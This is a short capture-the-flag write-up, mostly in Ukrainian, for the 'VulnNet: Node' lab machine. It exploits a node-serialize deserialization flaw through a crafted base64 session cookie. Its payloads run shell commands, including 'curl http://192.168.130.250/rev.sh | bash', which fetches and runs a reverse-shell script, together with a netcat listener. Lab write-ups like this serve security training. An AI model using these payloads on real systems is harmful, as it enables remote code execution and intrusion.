
# [VulnNet: Node - After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?] 

Складність: Easy

Ціль: 10.114.131.255

1. Розвідка (Reconnaissance & Enumeration)

    1.1. Сканування портів (Nmap):

   ```bash
   └─$ sudo nmap -sC -sV -p- -vv -oN nmap_result.txt 10.114.131.255 
   ```

    ![nmap](./img/nmap.png)

    ![cookies](./img/cookies.png)

   node-serialize (CVE-2017-5941 ???)  https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

```bash
─$ echo -n '{"username":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"ping -c 2 192.168.130.250\")} ()","isGuest":true,"encoding": "utf-8"}' | base64 -w 0
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoXCJwaW5nIC1jIDIgMTkyLjE2OC4xMzAuMjUwXCIpfSAoKSIsImlzR3Vlc3QiOnRydWUsImVuY29kaW5nIjogInV0Zi04In0=
```

```bash
└─$ curl http://10.114.131.255:8080 -H "Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoXCJwaW5nIC1jIDIgMTkyLjE2OC4xMzAuMjUwXCIpfSAoKSIsImlzR3Vlc3QiOnRydWUsImVuY29kaW5nIjogInV0Zi04In0="
```

```bash
└─$ sudo tcpdump -i tun0 icmp
```

![cookie_ping_test](./img/cookie_ping_test.png)

![rev_sh](./img/rev_sh.png)

```bash
└─$ python3 -m http.server 80
```

```bash
└─$ nc -nlvp 4444
```

```bash
─$ echo -n '{"username":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl http://192.168.130.250/rev.sh | bash\")} ()","isGuest":true,"encoding": "utf-8"}' | base64 -w 0 
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoXCJjdXJsIGh0dHA6Ly8xOTIuMTY4LjEzMC4yNTAvcmV2LnNoIHwgYmFzaFwiKX0gKCkiLCJpc0d1ZXN0Ijp0cnVlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9
─$ curl http://10.114.131.255:8080 -H "Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JlcXVpcmUoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoXCJjdXJsIGh0dHA6Ly8xOTIuMTY4LjEzMC4yNTAvcmV2LnNoIHwgYmFzaFwiKX0gKCkiLCJpc0d1ZXN0Ijp0cnVlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9"
```

![rev_shell](./img/rev_shell.png)
